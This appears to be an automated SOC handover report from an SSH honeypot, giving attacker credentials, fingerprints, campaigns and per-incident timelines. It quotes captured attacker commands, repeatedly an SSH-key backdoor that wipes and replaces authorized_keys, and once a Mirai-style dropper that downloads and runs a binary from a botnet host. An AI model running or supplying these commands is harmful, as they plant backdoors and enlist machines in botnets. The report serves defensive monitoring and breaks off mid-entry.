# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-28 |
| **Generated At** | 2026-11-28T05:25:43Z |
| **Shift Time** | 05:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **146** |
| Confirmed Threats | **129** |
| False Positives Filtered | **17** (11.6%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **25** |
| High Severity Cases | **86** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **60** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1663** |
| Unique Credential Pairs | **1487** |
| Unique Usernames | **430** |
| Unique Passwords | **1012** |
| Successful Auth Pairs | **1648** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 596 |
| `ubuntu` | 229 |
| `admin` | 40 |
| `user` | 27 |
| `deploy` | 23 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 78 |
| `123` | 41 |
| `1234` | 31 |
| `root` | 20 |
| `12345678` | 20 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 16 |
| `support` | `support` | 9 |
| `root` | `root3245gs5662d34111111111` | 8 |
| `admin` | `admin` | 5 |
| `root` | `qwer@1234` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qe35tu79o` | `154.51.59.118` | 2026-11-28T00:00:09 |
| `rootssssss23424123123` | `rootssssss23424123123` | `154.51.59.118` | 2026-11-28T00:00:13 |
| `root` | `root3245gs5662d34111111111` | `154.51.59.118` | 2026-11-28T00:00:17 |
| `ubuntu` | `admin123@` | `10.0.0.73` | 2026-11-28T00:01:43 |
| `ubuntu` | `a1!` | `177.75.235.46` | 2026-11-28T00:02:30 |
| `ubuntu` | `a1!` | `10.0.0.73` | 2026-11-28T00:04:51 |
| `ubuntu` | `Admin1234.` | `177.75.235.46` | 2026-11-28T00:05:41 |
| `root` | `Admin!@#$%^` | `10.0.0.73` | 2026-11-28T00:07:48 |
| `ubuntu` | `Admin1234.` | `10.0.0.73` | 2026-11-28T00:08:02 |
| `ubuntu` | `123qwe!` | `177.75.235.46` | 2026-11-28T00:08:49 |
| `root` | `Qwe123456@` | `163.52.135.28` | 2026-11-28T00:09:00 |
| `ubuntu` | `123qwe!` | `10.0.0.73` | 2026-11-28T00:11:13 |
| `ubuntu` | `Password#` | `177.75.235.46` | 2026-11-28T00:12:02 |
| `ubuntu` | `Password#` | `10.0.0.73` | 2026-11-28T00:14:26 |
| `root` | `Demo` | `163.52.135.28` | 2026-11-28T00:15:13 |
| `ubuntu` | `A1s2d3f4` | `177.75.235.46` | 2026-11-28T00:15:15 |
| `root` | `1q2w3e.123` | `103.172.113.196` | 2026-11-28T00:17:01 |
| `rootssssss23424123123` | `rootssssss23424123123` | `103.172.113.196` | 2026-11-28T00:17:05 |
| `root` | `Qaz12345678!` | `163.52.135.28` | 2026-11-28T00:17:09 |
| `root` | `root3245gs5662d34111111111` | `103.172.113.196` | 2026-11-28T00:17:11 |
_… 1628 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **146** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 43 |
| libssh | 37 |
| Unknown | 6 |
| Nmap scanner | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 35 | 18 |
| `2ec37a7cc8da...` | Mirai/variant | 21 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 8 | 2 |
| `0a07365cc01f...` | Generic scanner | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 35 | 18 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 21 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 8 | 2 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `95420f9d932d...` | Unknown | 3 | 3 | — |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `4e066189c3bb...` | Unknown | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **33** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 16 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `212.56.43.199`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.145.63.218`, `179.176.210.17`, `103.172.113.196`, `165.154.22.180`, `103.43.191.43`, `201.77.124.248`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **42** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 24 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS202425` | IP Volume inc | 2 | HIGH |
| `AS198364` | BANATSYNC SRL | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-48753da2f857

| Field | Detail |
|---|---|
| **Source IP** | `154.51.59[.]118` |
| **First Seen** | 2026-11-28 00:00 |
| **Last Seen** | 2026-11-28 00:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:00:07` | `cowrie.session.connect` |
| `2026-11-28 00:00:07` | `cowrie.client.version` |
| `2026-11-28 00:00:08` | `cowrie.client.kex` |
| `2026-11-28 00:00:09` | `cowrie.login.success` |
| `2026-11-28 00:00:10` | `cowrie.session.params` |
| `2026-11-28 00:00:10` | `cowrie.command.input` |
| `2026-11-28 00:00:10` | `cowrie.command.failed` |
| `2026-11-28 00:00:10` | `cowrie.log.closed` |
| `2026-11-28 00:00:12` | `cowrie.session.params` |
| `2026-11-28 00:00:12` | `cowrie.command.input` |
| `2026-11-28 00:00:12` | `cowrie.session.file_download` |
| `2026-11-28 00:00:12` | `cowrie.log.closed` |
| `2026-11-28 00:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.51.59[.]118` to AbuseIPDB if not already reported
- [ ] Block `154.51.59[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8dd7c0dbf1

| Field | Detail |
|---|---|
| **Source IP** | `154.51.59[.]118` |
| **First Seen** | 2026-11-28 00:00 |
| **Last Seen** | 2026-11-28 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:00:12` | `cowrie.session.connect` |
| `2026-11-28 00:00:12` | `cowrie.client.version` |
| `2026-11-28 00:00:12` | `cowrie.client.kex` |
| `2026-11-28 00:00:13` | `cowrie.login.success` |
| `2026-11-28 00:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.51.59[.]118` to AbuseIPDB if not already reported
- [ ] Block `154.51.59[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c468704164bf

| Field | Detail |
|---|---|
| **Source IP** | `177.75.235[.]46` |
| **First Seen** | 2026-11-28 00:02 |
| **Last Seen** | 2026-11-28 00:02 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:02:14` | `cowrie.session.connect` |
| `2026-11-28 00:02:17` | `cowrie.client.version` |
| `2026-11-28 00:02:17` | `cowrie.client.kex` |
| `2026-11-28 00:02:30` | `cowrie.login.success` |
| `2026-11-28 00:02:38` | `cowrie.session.params` |
| `2026-11-28 00:02:38` | `cowrie.command.input` |
| `2026-11-28 00:02:42` | `cowrie.log.closed` |
| `2026-11-28 00:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.75.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `177.75.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea405a2b0223

| Field | Detail |
|---|---|
| **Source IP** | `163.52.135[.]28` |
| **First Seen** | 2026-11-28 00:08 |
| **Last Seen** | 2026-11-28 00:09 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:08:25` | `cowrie.session.connect` |
| `2026-11-28 00:08:25` | `cowrie.client.version` |
| `2026-11-28 00:08:51` | `cowrie.client.kex` |
| `2026-11-28 00:09:00` | `cowrie.login.success` |
| `2026-11-28 00:09:18` | `cowrie.session.params` |
| `2026-11-28 00:09:18` | `cowrie.command.input` |
| `2026-11-28 00:09:20` | `cowrie.log.closed` |
| `2026-11-28 00:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.52.135[.]28` to AbuseIPDB if not already reported
- [ ] Block `163.52.135[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18fb72585ab8

| Field | Detail |
|---|---|
| **Source IP** | `103.172.113[.]196` |
| **First Seen** | 2026-11-28 00:17 |
| **Last Seen** | 2026-11-28 00:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:17:00` | `cowrie.session.connect` |
| `2026-11-28 00:17:00` | `cowrie.client.version` |
| `2026-11-28 00:17:00` | `cowrie.client.kex` |
| `2026-11-28 00:17:01` | `cowrie.login.success` |
| `2026-11-28 00:17:02` | `cowrie.session.params` |
| `2026-11-28 00:17:02` | `cowrie.command.input` |
| `2026-11-28 00:17:02` | `cowrie.command.failed` |
| `2026-11-28 00:17:03` | `cowrie.log.closed` |
| `2026-11-28 00:17:03` | `cowrie.session.params` |
| `2026-11-28 00:17:03` | `cowrie.command.input` |
| `2026-11-28 00:17:04` | `cowrie.session.file_download` |
| `2026-11-28 00:17:04` | `cowrie.log.closed` |
| `2026-11-28 00:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.113[.]196` to AbuseIPDB if not already reported
- [ ] Block `103.172.113[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e62f24f7e16

| Field | Detail |
|---|---|
| **Source IP** | `103.172.113[.]196` |
| **First Seen** | 2026-11-28 00:17 |
| **Last Seen** | 2026-11-28 00:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:17:04` | `cowrie.session.connect` |
| `2026-11-28 00:17:04` | `cowrie.client.version` |
| `2026-11-28 00:17:04` | `cowrie.client.kex` |
| `2026-11-28 00:17:05` | `cowrie.login.success` |
| `2026-11-28 00:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.113[.]196` to AbuseIPDB if not already reported
- [ ] Block `103.172.113[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1be55f4da8

| Field | Detail |
|---|---|
| **Source IP** | `103.145.63[.]218` |
| **First Seen** | 2026-11-28 00:19 |
| **Last Seen** | 2026-11-28 00:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:19:08` | `cowrie.session.connect` |
| `2026-11-28 00:19:08` | `cowrie.client.version` |
| `2026-11-28 00:19:08` | `cowrie.client.kex` |
| `2026-11-28 00:19:09` | `cowrie.login.success` |
| `2026-11-28 00:19:10` | `cowrie.session.params` |
| `2026-11-28 00:19:10` | `cowrie.command.input` |
| `2026-11-28 00:19:10` | `cowrie.command.failed` |
| `2026-11-28 00:19:11` | `cowrie.log.closed` |
| `2026-11-28 00:19:12` | `cowrie.session.params` |
| `2026-11-28 00:19:12` | `cowrie.command.input` |
| `2026-11-28 00:19:12` | `cowrie.session.file_download` |
| `2026-11-28 00:19:12` | `cowrie.log.closed` |
| `2026-11-28 00:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.145.63[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.145.63[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781d65c07c8c

| Field | Detail |
|---|---|
| **Source IP** | `103.145.63[.]218` |
| **First Seen** | 2026-11-28 00:19 |
| **Last Seen** | 2026-11-28 00:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:19:12` | `cowrie.session.connect` |
| `2026-11-28 00:19:12` | `cowrie.client.version` |
| `2026-11-28 00:19:12` | `cowrie.client.kex` |
| `2026-11-28 00:19:13` | `cowrie.login.success` |
| `2026-11-28 00:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.145.63[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.145.63[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ca5eb59723

| Field | Detail |
|---|---|
| **Source IP** | `121.163.224[.]97` |
| **First Seen** | 2026-11-28 00:29 |
| **Last Seen** | 2026-11-28 00:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://phubotnet.duckdns.org/main_mips -O main_mips || busybox wget hxxp://phubotnet.duckdns.org/main_mips -O main_mips || curl -O hxxp://phubotnet.duckdns.org/main_mips; busybox chmod 777 main_mips; chmod 777 main_mips; ./main_mips telnet &; rm -rf main_mips` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:29:11` | `cowrie.session.connect` |
| `2026-11-28 00:29:12` | `cowrie.telnet.option` |
| `2026-11-28 00:29:12` | `cowrie.login.success` |
| `2026-11-28 00:29:13` | `cowrie.session.params` |
| `2026-11-28 00:29:13` | `cowrie.telnet.option` |
| `2026-11-28 00:29:13` | `cowrie.telnet.option` |
| `2026-11-28 00:29:13` | `cowrie.command.input` |
| `2026-11-28 00:29:13` | `cowrie.log.closed` |
| `2026-11-28 00:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.163.224[.]97` to AbuseIPDB if not already reported
- [ ] Block `121.163.224[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650db64a4cd7

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-11-28 00:39 |
| **Last Seen** | 2026-11-28 00:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:39:59` | `cowrie.session.connect` |
| `2026-11-28 00:39:59` | `cowrie.client.version` |
| `2026-11-28 00:39:59` | `cowrie.client.kex` |
| `2026-11-28 00:40:00` | `cowrie.login.success` |
| `2026-11-28 00:40:01` | `cowrie.session.params` |
| `2026-11-28 00:40:01` | `cowrie.command.input` |
| `2026-11-28 00:40:01` | `cowrie.command.failed` |
| `2026-11-28 00:40:01` | `cowrie.log.closed` |
| `2026-11-28 00:40:02` | `cowrie.session.params` |
| `2026-11-28 00:40:02` | `cowrie.command.input` |
| `2026-11-28 00:40:02` | `cowrie.session.file_download` |
| `2026-11-28 00:40:02` | `cowrie.log.closed` |
| `2026-11-28 00:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11314b817e5

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-11-28 00:40 |
| **Last Seen** | 2026-11-28 00:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:40:02` | `cowrie.session.connect` |
| `2026-11-28 00:40:02` | `cowrie.client.version` |
| `2026-11-28 00:40:03` | `cowrie.client.kex` |
| `2026-11-28 00:40:04` | `cowrie.login.success` |
| `2026-11-28 00:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3871b853c99c

| Field | Detail |
|---|---|
| **Source IP** | `117.62.22[.]127` |
| **First Seen** | 2026-11-28 00:44 |
| **Last Seen** | 2026-11-28 00:49 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:44:34` | `cowrie.session.connect` |
| `2026-11-28 00:44:34` | `cowrie.client.version` |
| `2026-11-28 00:44:34` | `cowrie.client.kex` |
| `2026-11-28 00:44:35` | `cowrie.login.success` |
| `2026-11-28 00:44:36` | `cowrie.session.params` |
| `2026-11-28 00:44:36` | `cowrie.command.input` |
| `2026-11-28 00:44:36` | `cowrie.command.failed` |
| `2026-11-28 00:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.62.22[.]127` to AbuseIPDB if not already reported
- [ ] Block `117.62.22[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33e32d9183c

| Field | Detail |
|---|---|
| **Source IP** | `117.62.22[.]127` |
| **First Seen** | 2026-11-28 00:45 |
| **Last Seen** | 2026-11-28 00:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:45:00` | `cowrie.session.connect` |
| `2026-11-28 00:45:00` | `cowrie.client.version` |
| `2026-11-28 00:45:00` | `cowrie.client.kex` |
| `2026-11-28 00:45:01` | `cowrie.login.success` |
| `2026-11-28 00:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.62.22[.]127` to AbuseIPDB if not already reported
- [ ] Block `117.62.22[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccc49a4ab9c9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-28 00:46 |
| **Last Seen** | 2026-11-28 00:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:46:55` | `cowrie.session.connect` |
| `2026-11-28 00:46:55` | `cowrie.client.version` |
| `2026-11-28 00:46:56` | `cowrie.client.kex` |
| `2026-11-28 00:46:56` | `cowrie.login.success` |
| `2026-11-28 00:46:56` | `cowrie.direct-tcpip.request` |
| `2026-11-28 00:46:56` | `cowrie.direct-tcpip.data` |
| `2026-11-28 00:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e94cb4b517

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]47` |
| **First Seen** | 2026-11-28 00:48 |
| **Last Seen** | 2026-11-28 00:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-28 00:48:57` | `cowrie.session.connect` |
| `2026-11-28 00:48:57` | `cowrie.client.version` |
| `2026-11-28 00:48:57` | `cowrie.client.kex` |
